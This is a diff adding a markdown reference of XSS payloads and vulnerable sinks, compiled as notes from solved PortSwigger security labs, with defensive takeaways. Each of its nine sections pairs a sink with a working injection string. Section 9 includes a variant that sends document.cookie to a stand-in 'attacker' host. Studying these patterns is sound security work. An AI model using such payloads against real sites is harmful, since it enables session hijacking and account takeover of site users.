@@ -1,0 +1,157 @@
+# XSS Reference – PortSwigger Labs
+
+Concise reference notes for common XSS patterns, sinks, and working payloads.
+All labs listed here are already solved and documented for future recall.
+
+---
+
+## 1. Reflected XSS – HTML Context (No Encoding)
+
+Sink:
+<p>Search results for: USER_INPUT</p>
+
+Payload:
+<script>alert(1)</script>
+
+Notes:
+- User input reflected directly into HTML
+- Browser parses input as markup
+- Script executes immediately
+
+---
+
+## 2. Stored XSS – HTML Context (No Encoding)
+
+Sink:
+<div class="comment">USER_INPUT</div>
+
+Payload:
+<script>alert(1)</script>
+
+Notes:
+- Payload stored server-side
+- Executes for every user who views the page
+- High impact: session theft, admin compromise
+
+---
+
+## 3. DOM XSS – document.write() using location.search
+
+Sink:
+document.write('Search: ' + location.search);
+
+Payload:
+?"><script>alert(1)</script>
+
+Notes:
+- document.write injects raw HTML into the DOM
+- Executes during page render
+- Extremely dangerous sink
+
+---
+
+## 4. DOM XSS – innerHTML using location.search
+
+Sink:
+element.innerHTML = location.search;
+
+Payload:
+?<img src=x onerror=alert(1)>
+
+Notes:
+- innerHTML parses attacker-controlled HTML
+- Event handlers execute automatically
+- Safer alternative: textContent
+
+---
+
+## 5. DOM XSS – jQuery href Attribute Sink
+
+Sink:
+$('a').attr('href', location.search);
+
+Payload:
+?javascript:alert(1)
+
+Notes:
+- javascript: scheme allowed
+- Code executes when link is clicked
+- Common real-world issue in CMS/admin panels
+
+---
+
+## 6. DOM XSS – jQuery Selector Sink (:contains) with hashchange
+
+Sink:
+$('section.blog-list h2:contains(' + decodeURIComponent(location.hash.slice(1)) + ')');
+
+Payload:
+#<img src=x onerror=print()>
+
+Notes:
+- jQuery interprets selector input as HTML
+- Creates detached DOM nodes
+- Event handlers execute when node is attached or triggered
+- Selector injection ≠ string comparison
+
+---
+
+## 7. Reflected XSS – Attribute Context (Angle Brackets Encoded)
+
+Sink:
+<input value="USER_INPUT">
+
+Payload:
+" autofocus onfocus=alert(1) x="
+
+Notes:
+- < and > encoded, quotes not encoded
+- Breaks out of attribute value
+- Injects new event handler
+
+---
+
+## 8. Stored XSS – Anchor href Attribute (Quotes Encoded)
+
+Sink:
+<a href="USER_INPUT">Link</a>
+
+Payload:
+javascript:alert(1)
+
+Notes:
+- Quotes encoded but protocol not validated
+- javascript: URLs execute code on interaction
+- Very common logic flaw
+
+---
+
+## 9. Reflected XSS – JavaScript String Context (Angle Brackets Encoded)
+
+Sink:
+var search = 'USER_INPUT';
+
+Payload:
+';alert(1);//
+
+Notes:
+- Breaks out of JavaScript string
+- Comment truncates remaining code
+- Arbitrary JavaScript execution
+
+Advanced Variant:
+';fetch("https://attacker/?c="+document.cookie);//
+
+---
+
+## Key Takeaways
+
+- XSS depends on output context, not payloads
+- DOM XSS bypasses server-side defenses
+- Always identify source → sink flows
+- jQuery selectors and attributes are high-risk
+- Encoding must match the specific context
+
+---
+
+End of reference.
